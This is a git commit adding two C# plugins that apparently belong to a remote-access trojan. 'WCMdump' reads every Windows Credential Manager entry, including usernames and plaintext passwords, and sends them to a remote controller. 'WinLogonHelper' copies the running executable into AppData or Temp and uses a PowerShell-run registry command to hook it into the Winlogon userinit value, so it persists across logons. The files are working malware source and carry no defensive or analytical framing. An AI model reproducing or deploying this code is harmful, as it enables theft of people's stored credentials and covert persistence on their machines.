08faca9cd2434691a0102a64c7c7d444308d167b
ReLay <84751437+ReLay280h@users.noreply.github.com>
2023-08-23 01:32:52 +0800

    Add files via upload

---
+++ Plugin/WCMdump/WCMdump/Packet.cs
@@ -0,0 +1,62 @@
+﻿using MessagePackLib.MessagePack;
+using System;
+using Plugin.Handler;
+
+namespace Plugin
+{
+    public static class Packet
+    {
+        public static void Read(object data)
+        {
+            try
+            {
+                MsgPack unpack_msgpack = new MsgPack();
+                unpack_msgpack.DecodeFromBytes((byte[])data);
+                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
+                {
+                    case "wcmdump":
+                        {
+                            MsgPack msgpack = new MsgPack();
+                            msgpack.ForcePathObject("Pac_ket").AsString = "wcmdump";
+                            msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
+                            msgpack.ForcePathObject("Output").AsString = Output();
+                            Connection.Send(msgpack.Encode2Bytes());
+                            break;
+                        }
+
+                }
+            }
+            catch (Exception ex)
+            {
+                Error(ex.Message);
+            }
+        }
+        public static string Output()
+        {
+            string Creds = "";
+            var loadAll = Credential.LoadAll();
+            foreach (var creds in loadAll)
+            {
+                Creds += "[*] Username: " + creds.Username + "\n[*] Password: " + creds.Password + "\n[*] Target: " + creds.Target + "\n[*] Description: " + creds.Description + "\n[*] LastWriteTime: " + creds.LastWriteTime + "\n[*] LastWriteTimeUtc: " + creds.LastWriteTimeUtc + "\n[*] Type: " + creds.Type + "\n[*] PersistenceType " + creds.PersistenceType + "\n";
+            }
+            return Creds;
+        }
+
+        public static void Error(string ex)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
+            msgpack.ForcePathObject("Error").AsString = ex;
+            Connection.Send(msgpack.Encode2Bytes());
+        }
+        public static void Log(string message)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
+            msgpack.ForcePathObject("Message").AsString = message;
+            Connection.Send(msgpack.Encode2Bytes());
+        }
+
+    }
+
+}
---
+++ Plugin/WinLogonHelper/WinLogonHelper/Packet.cs
@@ -0,0 +1,102 @@
+﻿using MessagePackLib.MessagePack;
+using System;
+using System.Text;
+using System.Threading;
+using System.Management.Automation.Runspaces;
+using System.Security.Principal;
+using System.Diagnostics;
+using System.IO;
+
+namespace Plugin
+{
+    public static class Packet
+    {
+        public static void Read(object data)
+        {
+            try
+            {
+                MsgPack unpack_msgpack = new MsgPack();
+                unpack_msgpack.DecodeFromBytes((byte[])data);
+                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
+                {
+                    case "winlogonhelper":
+                        {
+                            WinlogonHelper();
+                            Connection.Disconnected();
+                            break;
+                        }
+                }
+            }
+            catch (Exception ex)
+            {
+                Error(ex.Message);
+            }
+        }
+        public static bool IsHighIntegrity()
+        {
+            // returns true if the current process is running with adminstrative privs in a high integrity context
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        public static void PSLoader(string cmd)
+        {
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            Pipeline pipeline = rs.CreatePipeline();
+            pipeline.Commands.AddScript(cmd);
+            pipeline.Invoke();
+            rs.Close();
+        }
+
+        public static void WinlogonHelper()
+        {
+            if (!IsHighIntegrity())
+            {
+                Log(Connection.Hwid + ":[-] Not in high integrity!");
+                return;
+            }
+            string name = Process.GetCurrentProcess().ProcessName + ".exe";
+
+            string filepath;
+            try
+            {
+                filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
+                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+            }
+            catch
+            {
+                filepath = Path.Combine(Path.GetTempPath(), name);
+                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+            }
+
+            string cmd = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v userinit /d C:\\Windows\\system32\\userinit.exe," + filepath + " /t reg_sz /f";
+            try
+            {
+                PSLoader(cmd);
+                Log(Connection.Hwid + ":[+] WinLogonHelper Success!");
+            }
+            catch(Exception ex)
+            {
+                Error(ex.Message);
+            }
+        }
+
+        public static void Error(string ex)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
+            msgpack.ForcePathObject("Error").AsString = ex;
+            Connection.Send(msgpack.Encode2Bytes());
+        }
+        public static void Log(string message)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
+            msgpack.ForcePathObject("Message").AsString = message;
+            Connection.Send(msgpack.Encode2Bytes());
+        }
+    }
+
+}
